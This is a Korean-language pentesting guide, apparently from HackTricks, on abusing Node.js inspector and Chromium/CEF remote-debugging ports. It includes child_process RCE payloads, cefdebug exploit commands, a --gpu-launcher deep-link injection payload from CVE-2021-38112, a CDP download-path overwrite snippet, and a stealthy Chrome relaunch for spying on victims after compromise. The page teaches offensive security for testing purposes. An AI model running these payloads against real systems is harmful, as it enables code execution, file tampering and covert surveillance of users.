# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

역사적인 실전 예시로는 Multimaster walkthrough와 CVE-2019-1414 Visual Studio Code debugger attack이 있으며, 모든 최신 Electron 또는 Chromium target이 동일한 primitive를 노출한다고 가정하지 말고 version-specific context로 사용하세요.<sup>[[1]](#references)[[3]](#references)</sup>

## 기본 정보

[문서에 따르면](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch와 함께 시작하면 Node.js process는 debugging client의 연결을 수신합니다. **기본적으로**, host 및 port **`127.0.0.1:9229`**에서 수신합니다. 각 process에는 **고유한** **UUID**도 할당됩니다.<sup>[[4]](#references)</sup>

Inspector client가 연결하려면 host address, port 및 UUID를 알고 지정해야 합니다. 전체 URL은 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`와 같은 형태입니다.<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger는 Node.js execution environment에 대한 full access 권한을 가지므로**, 이 port에 연결할 수 있는 malicious actor는 Node.js process를 대신하여 arbitrary code를 실행할 수 있습니다(**potential privilege escalation**).<sup>[[4]](#references)</sup>

Inspector를 시작하는 방법은 여러 가지가 있습니다:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
검사 중인 프로세스를 시작하면 다음과 비슷한 내용이 표시됩니다:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) 기반 프로세스는 `--remote-debugging-port=9222`를 사용해 debugger를 노출할 수 있습니다. 이는 Node.js inspector가 아니라 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 통해 browser를 노출하므로, Node.js `process` 기반 payload는 기본적으로 직접 적용되지 않습니다.<sup>[[2]](#references)[[5]](#references)</sup>

debugger가 활성화된 browser를 시작하면 다음과 비슷한 내용이 표시됩니다.<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets 및 same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

웹 브라우저에서 열리는 Websites는 브라우저 security model에 따라 WebSocket 및 HTTP requests를 전송할 수 있습니다. **고유한 debugger session id를 얻기 위해** **초기 HTTP connection**이 필요합니다. **same-origin-policy**는 Websites가 **이 HTTP connection**을 생성하지 못하도록 **방지합니다**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**에** 대한 추가 security를 위해 Node.js는 connection의 **'Host' headers**가 **IP address** 또는 정확히 **`localhost`**를 지정하는지 확인합니다.<sup>[[4]](#references)</sup>

> [!TIP]
> 이 **security measure는 단순히 HTTP request를 전송하는 것만으로**(SSRF vuln을 exploit하여 수행할 수 있음) **inspector를 exploit해 code를 실행하는 것을 방지합니다**.<sup>[[4]](#references)</sup>

### 실행 중인 processes에서 inspector 시작

실행 중인 nodejs process에 **signal SIGUSR1**을 전송하면 default port에서 **inspector를 시작**하도록 할 수 있습니다. 그러나 충분한 privileges가 필요하므로, 이 작업은 **process 내부 정보에 대한 privileged access**를 제공할 수 있지만 직접적인 privilege escalation은 발생하지 않는다는 점에 유의해야 합니다.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> 이는 container에서 유용합니다. 프로세스와 함께 **container**가 **종료되기** 때문에 `--inspect`를 사용하여 **프로세스를 종료하고 새 프로세스를 시작하는 것**은 **옵션이 아니기** 때문입니다.<sup>[[6]](#references)</sup>

### inspector/debugger에 연결

**Chromium 기반 browser**에 연결하려면 Chrome 또는 Edge에서 각각 `chrome://inspect` 또는 `edge://inspect` URL에 액세스할 수 있습니다. Configure 버튼을 클릭하여 **대상 host 및 port**가 올바르게 나열되어 있는지 확인해야 합니다. 다음 이미지는 Remote Code Execution (RCE) 예시를 보여 줍니다:<sup>[[2]](#references)[[4]](#references)</sup>

![debugger에 액세스할 URL이 표시됩니다. 예: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger에 연결: Chromium 기반 browser에 연결하려면 ...](<../../images/image (674).png>)

**command line**을 사용하면 다음과 같이 debugger/inspector에 연결할 수 있습니다:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) 도구를 사용하면 로컬에서 실행 중인 **inspectors**를 **find**하고 그 안에 **code**를 **inject**할 수 있습니다.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> **Chrome DevTools Protocol**을 통해 브라우저에 연결된 경우 **NodeJS RCE exploits**는 작동하지 않는다는 점에 유의하세요([**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)). (API를 확인하여 이를 통해 수행할 수 있는 흥미로운 작업을 찾아야 합니다.)<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector에서의 RCE

> [!TIP]
> [**Electron의 XSS에서 RCE를 얻는 방법을 찾고 있다면 이 페이지를 확인하세요.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Node **inspector**에 **connect**할 수 있을 때 **RCE**를 얻는 일반적인 방법으로는 다음과 같은 것을 사용할 수 있습니다(**Chrome DevTools protocol**에 연결할 때는 작동하지 않는 것으로 보입니다):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API는 여기에서 확인할 수 있습니다: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
이 섹션에서는 사람들이 이 protocol을 exploit하는 데 사용한 흥미로운 사례를 간단히 나열하겠습니다.

### Parameter Injection via Deep Links

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)에서 Rhino security는 CEF 기반 애플리케이션이 시스템에 custom URI (workspaces://index.html)를 **등록했으며**, 이 URI가 전체 URI를 수신한 다음 해당 URI로부터 일부 configuration을 구성하여 **CEF 기반 애플리케이션을 실행한다는 사실을 발견했습니다**.<sup>[[8]](#references)</sup>

URI parameter가 URL decoded된 후 CEF 기반 애플리케이션을 실행하는 데 사용된다는 사실이 발견되었으며, 이를 통해 사용자가 **command line**에 **`--gpu-launcher`** flag를 **inject**하여 임의의 작업을 실행할 수 있었습니다.<sup>[[8]](#references)</sup>

따라서 다음과 같은 payload를 사용할 수 있습니다:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe를 실행합니다.<sup>[[8]](#references)</sup>

### 파일 덮어쓰기

**다운로드한 파일이 저장될 폴더**를 변경하고 파일을 다운로드하여 애플리케이션에서 자주 사용하는 **source code**를 **악성 code**로 **덮어씁니다**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE 및 데이터 유출

STAR Labs는 노출된 WebDriver/CDP 서비스가 임의 파일 읽기와 RCE를 가능하게 할 수 있으며, 일부 구성에서는 DNS rebinding으로 exploit chain을 완성할 수 있음을 보여주었습니다.<sup>[[9]](#references)</sup>

추가적인 과거 browser-automation 및 Chromium 보안 사례는 Counter WebDriver write-up과 Project Zero 이슈 773, 1742, 1944를 참조하세요.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

실제 환경에서 **Chrome/Chromium 기반 browser를 사용하는 사용자 PC를 장악한 후** **debugging을 활성화하고 debugging port를 port-forward**하여 Chrome process를 실행하면 해당 process에 액세스할 수 있습니다. 이를 통해 **피해자가 Chrome에서 수행하는 모든 작업을 inspect하고 민감한 정보를 훔칠 수 있습니다**.<sup>[[7]](#references)</sup>

은밀하게 수행하려면 **모든 Chrome process를 종료한 다음** 다음과 비슷한 명령을 실행합니다:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code를 통한 Chrome DevTools Debugger 원격 코드 실행](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - 시작하기](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome의 Debugging 기능을 악용하여 원격으로 Browsing Session 관찰 및 제어하기](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces 원격 코드 실행](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding 및 CDP를 통한 WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter WebDriver - Bot에서 RCE까지](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
